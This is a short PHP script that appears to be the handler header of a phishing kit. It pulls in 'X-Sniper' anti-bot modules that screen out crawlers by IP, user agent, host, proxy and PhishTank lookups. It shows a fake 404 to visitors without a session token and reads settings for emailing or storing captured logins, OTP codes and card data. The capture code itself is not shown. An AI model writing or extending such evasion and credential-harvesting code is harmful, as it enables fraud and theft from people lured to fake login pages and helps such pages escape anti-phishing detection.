<?php
session_start();
error_reporting(0);

date_default_timezone_set('Africa/Cairo');

require ("../ElZero.php");
require ("../function.php");
require ("../../X-Sniper/antibot_ip.php");
require ("../../X-Sniper/antibot_userAgent.php");
require ("../../X-Sniper/antibot_host.php");
require ("../../X-Sniper/antibot_phishtank.php");
require ("../../X-Sniper/antibot_proxy.php");
require ("../../X-Sniper/someBots.php");
require ("../../X-Sniper/antibots5.php");
require ("../../X-Sniper/X-sniper1.php");
require ("../../X-Sniper/X-sniper2.php");


if (isset($_POST['hidden']) && !empty($_POST['elzeroKiller'])  ) {
	header("Location: ".$redirectLink);exit();
	
}
if (!isset($_SESSION['ElZeR0_ToKeN']) ) {
  header('HTTP/1.0 404 Not Found');exit();
}
if (!isset($_POST['tokenElzeroCsrf'])) {
  	header('HTTP/1.0 404 Not Found');exit();
	
}
if ($_POST['tokenElzeroCsrf'] != $_SESSION['ElZeR0_ToKeN']) {
  	header('HTTP/1.0 404 Not Found');exit();
	
}
$ip = getIp();
$date = date("d/m/Y h:i:s");
$sendToEmail = strtolower($sendToEmail);
$saveInAdminPanel = strtolower($saveInAdminPanel);
$Block_page = strtolower($Block_page);
$doubleLogin = strtolower($doubleLogin);
$doubleAccess = strtolower($doubleAccess);
$otp = strtolower($otp);
$allDomains = strtolower($allDomains);
$timeWaiting = strtolower($timeWaiting);
$doubleCredit = strtolower($doubleCredit);

?>